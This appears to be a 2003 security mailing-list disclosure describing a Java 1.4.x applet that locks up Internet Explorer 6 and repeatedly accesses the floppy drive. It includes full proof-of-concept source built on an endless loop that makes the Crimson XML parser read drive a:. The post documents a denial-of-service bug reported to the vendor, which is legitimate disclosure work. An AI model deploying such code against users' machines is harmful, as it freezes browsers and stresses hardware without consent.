Subject: IE6 & Java 1.4.2_02 applet: Hardware stress on floppy drive


-----BEGIN PGP SIGNED MESSAGE-----

Hi,

be prepared that your IE6 will be blocked if you
run the java plugin (any 1.4.x including 1.4.2_02)
with the following applet:

http://www.illegalaccess.org/exploits/java/applet/MyFloppySucks.html

Of course this only work when you have a drive a:.
Some may already know this applet but I found a way to
increase the frequency the floppy is accessed.
This is almost like the good old stepper motor
demo on the C1541 commodore drive, where the
floppy played a christmas song.

Sun has been informed about this issue over a week ago.
Since then I got no answer. Maybe they have no
floppy drives :-(

Here is the source:
import java.awt.Label;

public class MyFloppySucks extends java.applet.Applet {
	private Label m_labVersionVendor;
   public MyFloppySucks () //constructor
   {
     m_labVersionVendor = new Label ("Java Floppy Stress Testing Applet,
(2003) www.illegalaccess.org" +" / Java Version: " +
                                    System.getProperty("java.version")+
                           " from "+System.getProperty("java.vendor"));
     this.add(m_labVersionVendor);
   }
   public void paint(java.awt.Graphics g) {
        while (1==1)
	   try {

org.apache.crimson.tree.XmlDocument.createXmlDocument("file:///a:/",false);
	}
	catch (Exception e) {
		System.out.println("Java Floppy Stress Testing Applet,
(2003) www.illegalaccess.org");
	}
   }
}
